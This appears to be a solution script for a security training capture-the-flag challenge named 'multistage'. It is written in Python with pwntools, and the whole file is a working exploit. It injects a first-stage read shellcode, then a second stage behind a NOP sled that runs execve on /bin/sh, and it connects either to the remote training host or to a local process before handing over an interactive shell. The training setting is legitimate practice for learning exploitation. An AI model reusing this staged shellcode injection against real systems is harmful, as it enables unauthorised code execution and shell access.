# ncat bin.training.jinblack.it 2003

import sys
from pwn import *
from pwn import p64

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2003)
else:
    p = process("./multistage")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x401251
    """)

shellcode = asm("""
mov rsi, rax
xor rax, rax
xor rdi, rdi
xor rdx, rdx
mov dl, 0xff
syscall
""", arch='amd64')

payload = shellcode
length = len(shellcode)

p.sendafter(b"What is your name?\n", payload)

shellcode = asm("""
mov rax, 0x3B
mov rdi, 0x404070
add rdi, 100
mov rsi, rdi
mov rdx, rdi
add rdi, 8
syscall
""", arch='amd64')

payload = shellcode
total_length = length + len(shellcode)
payload = payload.rjust(total_length, b"\x90")
payload = payload.ljust(100, b"\x90")
payload += p64(0)
payload += b"/bin/sh\0"

p.sendafter(b"Executing you shellcode.", payload)

p.interactive()